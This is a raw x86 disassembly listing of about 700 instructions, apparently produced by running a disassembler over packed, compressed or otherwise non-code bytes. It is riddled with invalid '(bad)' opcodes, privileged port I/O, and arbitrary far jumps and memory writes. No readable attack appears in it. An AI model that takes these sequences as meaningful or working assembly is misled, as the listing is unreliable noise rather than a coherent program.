  40910c:	pop    esi
  40910d:	push   ebx
  40910e:	dec    edi
  40910f:	mov    al,ds:0x96ad8051
  409114:	outs   dx,DWORD PTR ds:[esi]
  409115:	aaa    
  409116:	sbb    DWORD PTR [ebx],ebx
  409118:	(bad)  
  409119:	loopne 0x4090bd
  40911b:	rcr    DWORD PTR [edi-0x7d5b20a5],1
  409121:	push   eax
  409122:	out    0xb8,al
  409124:	cmp    edi,DWORD PTR [ecx]
  409126:	mov    ebp,0x865887f2
  40912b:	xor    DWORD PTR [ebx],eax
  40912d:	(bad)  
  40912e:	int3   
  40912f:	pop    ebx
  409130:	retf   0xda59
  409133:	(bad)  
  409134:	je     0x409190
  409136:	imul   ecx,edi,0x1
  409139:	neg    BYTE PTR [esi+esi*4+0x787c2e26]
  409140:	je     0x4090d5
  409142:	sub    al,0x4
  409144:	dec    edx
  409145:	push   cs
  409146:	sahf   
  409147:	icebp  
  409148:	stos   DWORD PTR es:[edi],eax
  409149:	add    dh,ch
  40914b:	xor    eax,esp
  40914d:	add    esp,ecx
  40914f:	cmp    ebp,DWORD PTR [ebx]
  409151:	mov    cl,0x54
  409153:	repnz pop DWORD PTR [eax-0x7a4ce450]
  40915a:	jle    0x409117
  40915c:	aas    
  40915d:	cli    
  40915e:	scas   eax,DWORD PTR es:[edi]
  40915f:	add    al,0x10
  409161:	push   0x2f
  409163:	xchg   DWORD PTR [edi-0x6e0d68d3],ebx
  409169:	jno    0x409108
  40916b:	retf   0x250a
  40916e:	aad    0x39
  409170:	sbb    eax,0x6bab6e43
  409175:	mov    eax,0xd17261b1
  40917a:	pushf  
  40917b:	pop    ecx
  40917c:	retf   
  40917d:	mov    ecx,0x69c08ac9
  409182:	out    0xf5,eax
  409184:	xor    al,BYTE PTR [edx]
  409186:	mov    ah,0x8f
  409188:	mov    ecx,0x9d2baf05
  40918d:	push   esi
  40918e:	pop    ss
  40918f:	cmp    ebx,DWORD PTR [edi+0x5caf0bd0]
  409195:	fwait
  409196:	mov    esp,0x32aeb41e
  40919b:	dec    esp
  40919c:	inc    ebx
  40919d:	cmp    bh,BYTE PTR [ecx]
  40919f:	adc    esp,DWORD PTR [esi+0x15]
  4091a2:	push   edi
  4091a3:	rol    DWORD PTR [edx+0x54df000e],cl
  4091a9:	push   eax
  4091aa:	repnz sbb al,0x1
  4091ad:	add    BYTE PTR [ebx-0x22],ah
  4091b0:	pop    ebp
  4091b1:	je     0x409215
  4091b3:	mov    ds:0x76879637,eax
  4091b8:	xchg   BYTE PTR [ebx],ah
  4091ba:	jmp    0xbec2:0xa0336683
  4091c1:	jnp    0x40919b
  4091c3:	sbb    DWORD PTR [edi-0x69],0x6f
  4091c7:	data16 (bad) 
  4091c9:	(bad)  
  4091ca:	icebp  
  4091cb:	push   0xf56f711e
  4091d0:	add    DWORD PTR [esp+edi*1-0x74],ebp
  4091d4:	imul   esi,DWORD PTR [edx-0x58d86e8d],0x5074a4cb
  4091de:	int    0xbd
  4091e0:	or     BYTE PTR [ebp-0x11b1372],al
  4091e6:	stos   BYTE PTR es:[edi],al
  4091e7:	loop   0x4091af
  4091e9:	fist   DWORD PTR [ebx]
  4091eb:	repnz inc ecx
  4091ed:	xor    al,0x6a
  4091ef:	and    BYTE PTR [eax+0x1c],bh
  4091f2:	inc    ebx
  4091f3:	mov    eax,ds:0x81dba1b8
  4091f8:	repz imul edx,ebx,0xa4c6090a
  4091ff:	(bad)  
  409200:	push   edi
  409201:	sbb    dh,bh
  409203:	lds    eax,FWORD PTR [ecx-0x73e5e469]
  409209:	xor    bh,BYTE PTR [edi+ebx*8-0x23]
  40920d:	cmp    al,0xd
  40920f:	pop    eax
  409210:	mov    ds:0xf10dcb47,eax
  409215:	into   
  409216:	shr    DWORD PTR [eax+0x67d9fcb3],1
  40921c:	fdivr  QWORD PTR [ebx]
  40921e:	adc    eax,0xe8f5fce3
  409223:	xchg   edi,eax
  409224:	push   es
  409225:	push   0x7d
  409227:	(bad)  
  409228:	adc    edx,DWORD PTR [edi+0x4e403f68]
  40922e:	xchg   ebx,eax
  40922f:	and    ecx,DWORD PTR [edi]
  409231:	mov    eax,DWORD PTR [ebx-0x68270502]
  409237:	mov    ebx,0x736a51f6
  40923c:	into   
  40923d:	mov    esp,DWORD PTR [edi]
  40923f:	jp     0x4091d4
  409241:	test   BYTE PTR [edx],0x9d
  409244:	rcr    BYTE PTR [eax-0x1767a57d],0x81
  40924b:	push   edx
  40924c:	ret    
  40924d:	cmp    edi,DWORD PTR [esp+ecx*2+0x6c3d9422]
  409254:	mov    WORD PTR [esi],?
  409256:	push   ss
  409257:	sub    al,0x67
  40925a:	mov    ds:0xb8261059,al
  40925f:	xor    esi,ebx
  409261:	push   esi
  409262:	and    eax,0x536a0040
  409267:	xor    al,0x5
  409269:	mov    dh,0xcf
  40926b:	adc    WORD PTR [eax],dx
  40926e:	pop    ss
  40926f:	(bad)  
  409270:	ins    BYTE PTR es:[edi],dx
  409271:	push   0x0
  409273:	adc    BYTE PTR ds:0x69f75eee,0x52
  40927a:	(bad)  
  40927b:	in     eax,dx
  40927c:	pop    ebp
  40927d:	bound  ecx,QWORD PTR [eax-0x7d]
  409280:	sbb    eax,0x3770192d
  409285:	retf   
  409286:	push   ecx
  409287:	xchg   edi,eax
  409288:	mov    al,0xf5
  40928a:	cmp    ebx,DWORD PTR [eax-0x3d02b522]
  409290:	in     al,0x2d
  409292:	call   0xfd09:0x1428f357
  409299:	les    ecx,FWORD PTR [edx]
  40929b:	cwde   
  40929c:	ds dec eax
  40929e:	in     eax,0xb5
  4092a0:	leave  
  4092a1:	push   eax
  4092a2:	inc    DWORD PTR [ebx]
  4092a4:	ja     0x4092ae
  4092a6:	push   ss
  4092a7:	(bad)  
  4092a8:	(bad)  
  4092a9:	pop    edi
  4092aa:	ficomp DWORD PTR [edi+0x285c744]
  4092b0:	mov    ebx,ebp
  4092b2:	not    BYTE PTR [eax+0x4e264450]
  4092b8:	add    esp,esi
  4092ba:	aaa    
  4092bb:	data16 (bad) 
  4092be:	(bad)  
  4092bf:	or     esi,DWORD PTR [edi-0x1a7b5fe2]
  4092c5:	inc    esi
  4092c6:	adc    al,0xf0
  4092c8:	add    eax,0x3b3d9211
  4092cd:	scas   al,BYTE PTR es:[edi]
  4092ce:	push   esi
  4092cf:	adc    edx,DWORD PTR [ebp-0x5b]
  4092d2:	sbb    BYTE PTR [eax+edi*8],al
  4092d5:	popf   
  4092d6:	scas   al,BYTE PTR es:[edi]
  4092d7:	xchg   edi,eax
  4092d8:	or     DWORD PTR [eax],0x35
  4092db:	fdivp  st(2),st
  4092dd:	jmp    0xae1:0xa8eb2ff3
  4092e4:	xor    eax,0x75e7de0b
  4092e9:	dec    ebp
  4092ea:	pop    edx
  4092eb:	aas    
  4092ec:	cdq    
  4092ed:	jno    0x4092d1
  4092ef:	bound  edx,QWORD PTR [ebx]
  4092f1:	mov    al,ds:0x505569
  4092f6:	je     0x409337
  4092f8:	lock out 0xb5,eax
  4092fb:	mov    dh,0xce
  4092fd:	sti    
  4092fe:	(bad)  
  4092ff:	fldcw  WORD PTR [edx-0x24120270]
  409305:	popa   
  409306:	sub    eax,0x73e25e76
  40930b:	in     eax,0xd2
  40930d:	in     al,0x96
  40930f:	(bad)  
  409311:	cmp    eax,0x8cd4dfd3
  409316:	mul    BYTE PTR [ebx+0x5a]
  409319:	ja     0x40931c
  40931b:	cmp    DWORD PTR [ebx+0x1e],ecx
  40931e:	jnp    0x4092b3
  409320:	adc    dl,ch
  409322:	daa    
  409323:	stos   DWORD PTR es:[edi],eax
  409324:	add    dl,BYTE PTR [edi]
  409326:	jno    0x409324
  409328:	jae    0x40935c
  40932a:	xor    dh,BYTE PTR [edx-0x73]
  40932d:	lock mov edx,0xfb5e96b7
  409333:	inc    edi
  409334:	mov    ah,ch
  409336:	ja     0x409333
  409338:	mov    dl,0x36
  40933a:	in     eax,dx
  40933b:	pop    ebx
  40933c:	gs inc eax
  40933e:	add    al,0xf5
  409340:	ud2    
  409342:	cdq    
  409343:	xchg   edx,eax
  409344:	and    edi,esi
  409346:	push   edx
  409347:	sbb    BYTE PTR [eax],ch
  409349:	outs   dx,BYTE PTR ds:[esi]
  40934a:	mov    eax,0x221576f6
  40934f:	(bad)  
  409350:	push   ecx
  409351:	cmp    al,0xab
  409353:	jg     0x4093b4
  409355:	push   ebx
  409356:	ins    DWORD PTR es:[edi],dx
  409357:	or     al,0xd7
  409359:	jl     0x409323
  40935b:	add    eax,0x98343e7c
  409360:	add    DWORD PTR [ebx-0x51],ebx
  409363:	xchg   edx,eax
  409364:	scas   eax,DWORD PTR es:[edi]
  409365:	sti    
  409366:	out    dx,eax
  409367:	mov    ecx,DWORD PTR [edi+0x7700c1c7]
  40936d:	mov    ah,0xe5
  40936f:	dec    ecx
  409370:	mov    eax,ds:0xc34231c2
  409375:	pop    ebx
  409376:	add    eax,0xf949e751
  40937b:	loope  0x40930a
  40937d:	jno    0x409321
  40937f:	xchg   esp,eax
  409380:	pop    ecx
  409381:	test   al,0x7
  409383:	inc    esp
  409384:	pop    ebp
  409385:	mov    al,0x5c
  409387:	cmp    dh,BYTE PTR [ebp+0x37]
  40938a:	clc    
  40938b:	xchg   BYTE PTR [edi],al
  40938d:	pop    es
  40938e:	mov    ebx,0x5aec5f4f
  409393:	icebp  
  409394:	mov    ebx,0xc893c41b
  409399:	mov    bh,0x58
  40939b:	adc    al,0xee
  40939d:	outs   dx,DWORD PTR ds:[esi]
  40939e:	hlt    
  40939f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093a0:	stos   DWORD PTR es:[edi],eax
  4093a1:	mov    esp,0xc5ea9236
  4093a6:	sbb    BYTE PTR [edi],0x41
  4093a9:	retf   
  4093aa:	jge    0x40941a
  4093ac:	pop    edx
  4093ad:	push   eax
  4093ae:	push   cs
  4093af:	repz call 0x4ce6:0x6bfedfcb
  4093b7:	leave  
  4093b8:	scas   eax,DWORD PTR es:[edi]
  4093b9:	xlat   BYTE PTR ds:[ebx]
  4093ba:	fdiv   st,st(6)
  4093bc:	sub    BYTE PTR [ebp+0x70],al
  4093bf:	jmp    0x868d:0xa8a6c171
  4093c6:	push   ecx
  4093c7:	sbb    eax,0x4adedccd
  4093cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093cd:	and    ebx,DWORD PTR [ebp-0x7d55a19d]
  4093d3:	jns    0x409366
  4093d5:	jne    0x409364
  4093d7:	bound  ebp,QWORD PTR [ecx+0x5d]
  4093da:	adc    dh,BYTE PTR cs:[ecx-0x2cf1bde3]
  4093e1:	data16 clc 
  4093e3:	push   esi
  4093e4:	sub    BYTE PTR ds:0x1c7bfc2d,ch
  4093ea:	dec    esp
  4093eb:	jp     0x40943d
  4093ed:	outs   dx,DWORD PTR ds:[esi]
  4093ee:	fisttp QWORD PTR [eax+eiz*4]
  4093f1:	or     al,0x26
  4093f3:	mul    BYTE PTR [edx-0x1e]
  4093f6:	mov    al,ds:0x4d779197
  4093fb:	xor    bl,ch
  4093fd:	mov    dl,0xd1
  4093ff:	lea    edx,[esi]
  409401:	inc    ebx
  409402:	pushf  
  409403:	sub    DWORD PTR ds:0xd31aa465,esp
  409409:	inc    ebx
  40940a:	sub    BYTE PTR [ebp+esi*4-0x3bbe78c0],ch
  409411:	pop    edi
  409412:	mov    esi,0x7e1ae7d1
  409417:	jnp    0x409435
  409419:	or     al,BYTE PTR [eax]
  40941b:	mov    bl,BYTE PTR [ebp+0x14]
  40941e:	shr    ebx,0x4f
  409421:	call   0x3f49efcc
  409426:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409427:	and    BYTE PTR [eax],0x55
  40942a:	ret    0x4144
  40942d:	sbb    eax,0x1d2b2996
  409432:	xchg   esi,eax
  409433:	jecxz  0x409493
  409435:	out    dx,al
  409436:	and    ebp,DWORD PTR [ecx]
  409438:	cmp    eax,0x190c62b8
  40943d:	push   esp
  40943e:	lods   eax,DWORD PTR fs:[esi]
  409440:	inc    eax
  409441:	xor    al,0x39
  409443:	inc    esp
  409444:	lock (bad) 
  409446:	retf   0xe9e7
  409449:	jne    0x40946d
  40944b:	mov    ss,WORD PTR [ecx-0x20]
  40944e:	pop    ds
  40944f:	push   ecx
  409450:	add    al,0x45
  409452:	neg    DWORD PTR [ebp+0x3ce90732]
  409458:	fadd   DWORD PTR [edi+0x31]
  40945b:	inc    ebx
  40945c:	call   0x6cf:0x96b5fa9b
  409463:	rep ins DWORD PTR es:[edi],dx
  409465:	inc    edi
  409466:	pop    ebp
  409467:	and    DWORD PTR [esi+0xa],edx
  40946a:	mov    edi,0xeb036260
  40946f:	(bad)  
  409471:	mov    ds:0x745eeee5,al
  409476:	pop    ss
  409477:	push   edi
  409478:	add    esi,DWORD PTR [eax]
  40947a:	mov    dl,0x4
  40947c:	sbb    al,0x58
  40947e:	mov    bh,0x6
  409480:	rol    DWORD PTR [ecx],0x49
  409483:	outs   dx,BYTE PTR ds:[esi]
  409484:	std    
  409485:	mov    al,ds:0x4455d60e
  40948a:	xor    eax,0xd1b1d486
  40948f:	push   ss
  409490:	das    
  409491:	adc    al,0xfb
  409493:	outs   dx,BYTE PTR ds:[esi]
  409494:	adc    cl,al
  409496:	inc    eax
  409497:	add    DWORD PTR [ecx+eiz*1+0x47],esp
  40949b:	add    edx,DWORD PTR [ecx]
  40949d:	pusha  
  40949e:	pop    es
  40949f:	neg    bl
  4094a1:	sbb    eax,0xd3d17542
  4094a6:	cmp    DWORD PTR [edi-0x5d],esp
  4094a9:	cmp    DWORD PTR [eax],edx
  4094ab:	fdivr  QWORD PTR [edx+0x40]
  4094ae:	pop    edi
  4094af:	lods   al,BYTE PTR ds:[esi]
  4094b0:	xchg   esp,eax
  4094b1:	xor    cl,BYTE PTR [ebx-0x50660c18]
  4094b7:	cmp    dl,BYTE PTR [esi-0x6d08783f]
  4094bd:	loop   0x4094d2
  4094bf:	xchg   esi,eax
  4094c0:	ds cld 
  4094c2:	into   
  4094c3:	fild   DWORD PTR [edx]
  4094c5:	out    dx,al
  4094c6:	add    DWORD PTR [eax-0x396409a4],eax
  4094cc:	lds    edi,FWORD PTR [esi-0x16]
  4094cf:	mov    ?,WORD PTR [ebx-0x641deac1]
  4094d5:	fild   WORD PTR [eax+ebx*8-0x6a]
  4094d9:	shr    BYTE PTR [edi+0x3f],cl
  4094dc:	fcmovbe st,st(0)
  4094de:	mov    WORD PTR [ecx+edx*8],?
  4094e1:	and    bh,cl
  4094e3:	rcl    BYTE PTR [ebx],1
  4094e5:	adc    eax,0x894e5ef5
  4094ea:	outs   dx,BYTE PTR ds:[esi]
  4094eb:	cmc    
  4094ec:	pop    es
  4094ed:	and    BYTE PTR [ebp-0x4ef434b2],0xe9
  4094f4:	(bad)  
  4094f5:	sub    eax,0x9d9f7955
  4094fa:	mov    ebp,0x575c4fb8
  4094ff:	call   0x98f10de1
  409504:	test   eax,0x91bfdc5a
  409509:	jne    0x4094bc
  40950b:	iret   
  40950c:	(bad)  
  40950e:	mov    DWORD PTR [ebp-0x1],ecx
  409511:	scas   al,BYTE PTR es:[edi]
  409512:	les    edi,FWORD PTR [edi-0x9dbdd3e]
  409518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409519:	push   esp
  40951a:	inc    esp
  40951b:	jmp    0xd45575b8
  409520:	pop    edx
  409521:	push   es
  409522:	dec    ebx
  409523:	(bad)  
  409524:	leave  
  409525:	loope  0x409519
  409527:	shr    DWORD PTR [eax],cl
  409529:	popf   
  40952a:	ss jg  0x40954a
  40952d:	xchg   ebx,eax
  40952e:	adc    DWORD PTR [edx+esi*1-0xc],eax
  409532:	adc    eax,0x30d5fe3e
  409537:	scas   al,BYTE PTR es:[edi]
  409538:	hlt    
  409539:	cmp    DWORD PTR [edi+0xa],eax
  40953c:	mov    edx,0xf244ab44
  409541:	lods   al,BYTE PTR ds:[esi]
  409542:	add    al,0x15
  409544:	and    dh,dl
  409546:	sub    esi,DWORD PTR [ebx-0x7e]
  409549:	pop    ebp
  40954a:	stc    
  40954b:	outs   dx,BYTE PTR ds:[esi]
  40954c:	inc    edx
  40954d:	jle    0x40957c
  40954f:	xor    eax,0x5c86e9cd
  409554:	jns    0x409519
  409556:	dec    edx
  409557:	sbb    al,0x71
  409559:	lahf   
  40955a:	cli    
  40955b:	imul   eax,DWORD PTR [edi+0x33],0x59
  40955f:	out    0x85,al
  409561:	imul   edi,DWORD PTR [edi],0x40
  409564:	fwait
  409565:	inc    edi
  409566:	ins    DWORD PTR es:[edi],dx
  409567:	push   esp
  409568:	cli    
  409569:	repz scas eax,DWORD PTR es:[edi]
  40956b:	dec    edx
  40956c:	push   cs
  40956d:	push   0xffffff95
  40956f:	gs pop ecx
  409571:	fnstenv [eax]
  409573:	fistp  DWORD PTR [esi+0x75]
  409576:	add    BYTE PTR [esi-0x6],dh
  409579:	mov    eax,0xa549d8db
  40957e:	shl    BYTE PTR [edx+0x641a6540],1
  409584:	fdiv   DWORD PTR [eax+0x71b9a268]
  40958a:	imul   ebx,DWORD PTR [eax+eiz*2-0x2d296244],0xce6f89c7
  409595:	xor    ebp,DWORD PTR [ebp+0x57]
  409598:	cmp    eax,0x5288af11
  40959d:	fisttp DWORD PTR [ebp+0x4e6c53f0]
  4095a3:	inc    ebx
  4095a4:	xor    eax,0xfffe9bf0
  4095a9:	mov    dh,0x20
  4095ab:	mov    eax,0x2003e4b9
  4095b0:	int3   
  4095b1:	xchg   esp,eax
  4095b2:	pop    es
  4095b3:	clc    
  4095b4:	fstp   TBYTE PTR [ebp+0xc]
  4095b7:	in     al,0x61
  4095b9:	add    DWORD PTR [ecx-0x7d733d4b],edi
  4095bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095c0:	outs   dx,BYTE PTR ds:[esi]
  4095c1:	cmc    
  4095c2:	inc    ecx
  4095c3:	popa   
  4095c4:	ficomp DWORD PTR [edi+0x7b]
  4095c7:	inc    BYTE PTR [edi]
  4095c9:	add    ecx,DWORD PTR [ebx-0x51]
  4095cc:	icebp  
  4095cd:	or     edx,DWORD PTR [eax+eax*1-0x3f]
  4095d1:	pop    ebx
  4095d2:	cmp    al,0xa6
  4095d4:	out    dx,al
  4095d5:	aas    
  4095d6:	pop    eax
  4095d7:	jo     0x409658
  4095d9:	rcr    DWORD PTR [edi-0x18],cl
  4095dc:	inc    esi
  4095dd:	outs   dx,BYTE PTR ds:[esi]
  4095de:	push   eax
  4095df:	leave  
  4095e0:	xchg   edi,eax
  4095e1:	and    eax,0x1daad902
  4095e6:	out    0x8c,al
  4095e8:	int    0xfe
  4095ea:	pop    ebx
  4095eb:	outs   dx,DWORD PTR ds:[esi]
  4095ec:	mov    al,ds:0x3ebcb6ff
  4095f1:	mov    ah,0xfd
  4095f3:	jns    0x4095d8
  4095f5:	int3   
  4095f6:	push   ss
  4095f7:	xlat   BYTE PTR ds:[ebx]
  4095f8:	lods   eax,DWORD PTR ds:[esi]
  4095f9:	stos   BYTE PTR es:[edi],al
  4095fa:	cdq    
  4095fb:	pushf  
  4095fc:	fnstcw WORD PTR ds:0x8f1402fc
  409602:	push   esp
  409603:	shl    DWORD PTR [edx+0x15437442],cl
  409609:	or     al,0x65
  40960b:	test   DWORD PTR [edi+0x19],esp
  40960e:	cld    
  40960f:	cwde   
  409610:	loopne 0x4095c5
  409612:	or     al,0xc0
  409614:	fimul  WORD PTR [eax-0x1a]
  409617:	jns    0x409633
  409619:	cmp    eax,0x24725cb1
  40961e:	pop    esi
  40961f:	sub    DWORD PTR [esp+eax*2+0x43914053],edi
  409626:	pop    edi
  409627:	(bad)  
  409628:	adc    ebx,DWORD PTR [eax-0x55]
  40962b:	out    dx,eax
  40962c:	test   eax,0xf2fa3df4
  409631:	and    dl,BYTE PTR [edx]
  409633:	mov    ds,WORD PTR [edi+0x36b9e198]
  409639:	jle    0x409624
  40963b:	das    
  40963c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40963d:	push   ebx
  40963e:	push   ecx
  40963f:	push   0x286b218b
  409644:	xor    esi,DWORD PTR [ebx+0x50160f5c]
  40964a:	jae    0x409628
  40964c:	or     DWORD PTR [edi+ebp*2-0x6242e8fd],eax
  409653:	adc    DWORD PTR [eax+0x1b],ecx
  409656:	jo     0x4096a1
  409658:	(bad)  
  409659:	cld    
  40965a:	popa   
  40965b:	sub    dl,bl
  40965d:	jmp    0xd375:0x1be2dea1
  409664:	adc    DWORD PTR [eax-0x78df4d34],ecx
  40966a:	jmp    0x4096b5
  40966c:	xchg   edi,eax
  40966d:	fiadd  DWORD PTR [ebx-0x61]
  409670:	pop    eax
  409671:	sub    al,0x7a
  409673:	sbb    al,0xb8
  409675:	push   ds
  409676:	hlt    
  409677:	xor    ebx,eax
  409679:	fmul   st,st(4)
  40967b:	aad    0xca
  40967d:	in     eax,dx
  40967e:	fidivr DWORD PTR es:[ebp+0x151150e4]
  409685:	pop    eax
  409686:	clc    
  409687:	fdivr  st,st(6)
  409689:	stos   BYTE PTR es:[edi],al
  40968a:	mov    WORD PTR [esi-0x11],?
  40968d:	push   esi
  40968e:	jb     0x409677
  409690:	mov    ds:0x97ba6461,eax
  409695:	hlt    
  409696:	ret    
  409697:	add    eax,0x358d826a
  40969c:	push   edi
  40969d:	xchg   ebx,eax
  40969e:	(bad)  
  40969f:	sbb    eax,0xfdbd9827
  4096a4:	inc    ecx
  4096a5:	pop    ebx
  4096a6:	xchg   esi,eax
  4096a7:	stos   DWORD PTR es:[edi],eax
  4096a8:	cwde   
  4096a9:	fisttp QWORD PTR [eax]
  4096ab:	bound  edx,QWORD PTR ds:0x9f609549
  4096b1:	pop    ecx
  4096b2:	pop    ebx
  4096b3:	les    ebx,FWORD PTR [edx-0x436291f1]
  4096b9:	aaa    
  4096ba:	mov    al,ds:0x295d4284
  4096bf:	test   edi,esi
  4096c1:	cmp    ch,BYTE PTR [ebx]
  4096c3:	test   al,0x6b
  4096c5:	mov    dh,0x27
  4096c7:	push   eax
  4096c8:	dec    ecx
  4096c9:	sub    al,0xf2
  4096cb:	dec    ebp
  4096cc:	outs   dx,BYTE PTR ds:[esi]
  4096cd:	mov    ebp,0x54fbbc1e
  4096d2:	jmp    0x4096f6
  4096d4:	sbb    DWORD PTR [edi-0x5941f278],esi
  4096da:	jle    0x409710
  4096dc:	shr    BYTE PTR [edi+0x6a],cl
  4096df:	outs   dx,BYTE PTR ds:[esi]
  4096e0:	idiv   DWORD PTR [ecx+ebp*1-0x54]
  4096e4:	int    0xd
  4096e6:	and    cl,BYTE PTR [eax]
  4096e8:	adc    edx,DWORD PTR [ebp-0x93a93f7]
  4096ee:	jmp    0x368c3103
  4096f3:	cdq    
  4096f4:	retf   0x89cf
  4096f7:	mul    DWORD PTR [eax+0x1d]
  4096fa:	shl    bl,0xab
  4096fd:	aam    0x30
  4096ff:	sbb    al,BYTE PTR [edx]
  409701:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409702:	fwait
  409703:	and    al,0x10
  409705:	add    dl,BYTE PTR [edx]
  409707:	lods   al,BYTE PTR ds:[esi]
  409708:	ins    BYTE PTR es:[edi],dx
  409709:	xor    al,0x6
  40970b:	in     eax,0xd1
  40970d:	cmp    eax,0x170b8747
  409712:	pop    ds
  409713:	out    0xca,eax
  409715:	dec    edx
  409716:	inc    esp
  409718:	(bad)  
  409719:	test   eax,0x24bebf50
  40971e:	sub    eax,0x919c0d1b
  409723:	mov    al,ds:0xc09c83b2
  409728:	nop
  409729:	and    al,0x56
  40972b:	stc    
  40972c:	ficomp WORD PTR [ecx-0x41]
  40972f:	imul   esp,DWORD PTR [esi],0x3d
  409732:	pusha  
  409733:	jmp    FWORD PTR [ecx]
  409735:	lahf   
  409736:	aam    0x72
  409738:	jbe    0x409790
  40973a:	jmp    0xde297d15
  40973f:	(bad)  
  409740:	cs retf 
  409742:	jmp    0xf501a8b6
  409747:	mov    bl,0xdb
  409749:	sbb    al,BYTE PTR [ecx+0x3b]
  40974c:	ret    
  40974d:	rcl    BYTE PTR [eax-0x38dec60e],0x16
  409754:	ds je  0x409738
  409757:	sub    ch,BYTE PTR [edi-0x2ab9a6f4]
  40975d:	push   edx
  40975e:	push   ss
  40975f:	add    cl,0xd7
  409762:	push   ecx
  409763:	add    esp,ecx
  409765:	add    DWORD PTR [ebx-0x4ee79907],eax
  40976b:	mov    ds:0xe6e44452,eax
  409770:	sub    esp,DWORD PTR [ecx+eiz*2]
  409773:	and    eax,0xa5800e46
  409778:	in     eax,0xa0
  40977a:	test   eax,0x9e619a2a
  40977f:	mov    bl,0x84
  409781:	stos   BYTE PTR es:[edi],al
  409782:	int    0x5d
  409784:	fs sbb eax,0x157caff5
  40978a:	xchg   BYTE PTR [ebx-0x50bfd4d3],dh
  409790:	outs   dx,DWORD PTR ds:[esi]
  409791:	mov    ?,WORD PTR [esi]
  409793:	xor    esi,DWORD PTR [edi+esi*1+0x61dd806d]
  40979a:	(bad)  
  40979c:	pop    eax
  40979d:	add    cl,ah
  40979f:	daa    
  4097a0:	sub    DWORD PTR [edi+edx*2+0x31],ebx
  4097a4:	inc    ecx
  4097a5:	imul   edi,DWORD PTR [ebx+ecx*4-0xc616633],0x78794c4a
  4097b0:	mov    ds:0x38f92a56,eax
  4097b5:	ficomp DWORD PTR [ebx+0x65]
  4097b8:	sbb    bh,bh
  4097ba:	cli    
  4097bb:	popf   
  4097bc:	jb     0x409812
  4097be:	cmp    ebx,DWORD PTR [edi-0x54088441]
  4097c4:	pop    eax
  4097c5:	xchg   edi,eax
  4097c6:	ret    
  4097c7:	shr    DWORD PTR [ecx+0x7c5dd4c9],0x1a
  4097ce:	jbe    0x409811
  4097d0:	jp     0x40982a
  4097d2:	pop    ss
  4097d3:	jmp    0x409790
  4097d5:	out    0x46,eax
  4097d7:	pop    ebx
  4097d8:	jg     0x40977b
  4097da:	adc    al,0x2e
  4097dc:	pop    ds
  4097dd:	inc    ebx
  4097de:	test   al,0xb2
  4097e0:	dec    eax
  4097e1:	sbb    cl,BYTE PTR ds:0x52c37b09
  4097e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097e8:	xchg   edx,eax
  4097e9:	cmc    
  4097ea:	sub    ecx,DWORD PTR [edx]
  4097ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097ed:	jge    0x409846
  4097ef:	mov    ebx,DWORD PTR [ecx]
  4097f1:	sahf   
  4097f2:	and    BYTE PTR [bx+0x1ab8],al
  4097f7:	sbb    cl,0x14
  4097fa:	cmp    eax,0xef637686
  4097ff:	arpl   WORD PTR [edx-0x79],ax
  409802:	pop    esp
  409803:	cmp    al,0x44
  409805:	dec    esp
  409806:	jmp    0x4097a3
  409808:	nop
  409809:	ret    
  40980a:	push   ebx
  40980b:	add    BYTE PTR [ebx-0x336db6a7],dh
  409811:	les    edx,FWORD PTR [ebp+0x3bbe5233]
  409817:	out    0xcc,al
  409819:	mov    ebp,0x53a54900
  40981e:	mov    bl,0xa9
  409820:	cmp    esp,edx
  409822:	rcl    DWORD PTR [ebp-0x19],cl
  409825:	xor    ecx,DWORD PTR [esi-0x17]
  409828:	dec    eax
  409829:	bound  ecx,QWORD PTR [eax+0x3781619a]
  40982f:	adc    ecx,DWORD PTR [eax]
  409831:	push   ebx
  409832:	shr    BYTE PTR [edi-0x33],1
  409835:	ret    
  409836:	icebp  
  409837:	data16 or BYTE PTR [ecx-0x1a],cl
  40983b:	mov    eax,0x838a4657
  409840:	jp     0x40981b
  409842:	push   ds
  409843:	xchg   ebx,eax
  409844:	mov    dl,dl
  409846:	jg     0x4097ee
  409848:	imul   ebp,DWORD PTR [ecx+0x331a182f],0x7b
  40984f:	enter  0x3c11,0x96
  409853:	aaa    
  409854:	sub    al,0x2e
  409856:	xor    esp,ebx
  409858:	lods   al,BYTE PTR ds:[esi]
  409859:	push   ebp
  40985a:	loopne 0x40980f
  40985c:	and    DWORD PTR [edx-0x73],esi
  40985f:	add    al,0xf0
  409861:	push   esp
  409862:	ds (bad) 
  409864:	mov    edx,0x48834c0d
  409869:	push   ebp
  40986a:	and    dl,BYTE PTR [esi+0x4ea104a]
  409870:	clc    
  409871:	xchg   ebx,eax
  409872:	sbb    esp,DWORD PTR [eax-0x148fb05f]
  409878:	push   ecx
  409879:	arpl   WORD PTR [ecx+0x39],ax
  40987c:	(bad)  
  40987d:	rcl    DWORD PTR [ecx+0x22412655],cl
  409883:	stos   DWORD PTR es:[edi],eax
  409884:	add    cl,ch
  409886:	outs   dx,DWORD PTR ds:[esi]
  409887:	jno    0x40988f
  409889:	iret   
  40988a:	stos   DWORD PTR es:[edi],eax
  40988b:	loop   0x40985e
  40988d:	daa    
  40988e:	hlt    
  40988f:	adc    dl,bh
  409891:	add    eax,esp
  409893:	mov    ebx,0xc27ba62d
  409898:	inc    ebp
  409899:	cmp    BYTE PTR [edi],0xf4
  40989c:	xor    esi,DWORD PTR [eax+0x62779324]
  4098a2:	inc    eax
  4098a3:	test   al,0xe4
  4098a5:	lds    ebx,FWORD PTR [esp+edi*4-0x7ab4da26]
  4098ac:	pusha  
  4098ad:	fimul  DWORD PTR [ecx-0x5a5ee42]
  4098b3:	fwait
  4098b4:	jo     0x409844
  4098b6:	pop    eax
  4098b7:	push   ds
  4098b8:	repnz xchg edi,eax
  4098ba:	enter  0x8eb,0x49
  4098be:	imul   esi,DWORD PTR [edx],0xffffffd4
  4098c1:	jle    0x409899
  4098c3:	nop
  4098c4:	pop    edi
  4098c5:	mov    DWORD PTR [ecx+0x3c61c698],edx
  4098cb:	xchg   esp,eax
  4098cc:	dec    ebp
  4098cd:	dec    esp
  4098ce:	inc    edi
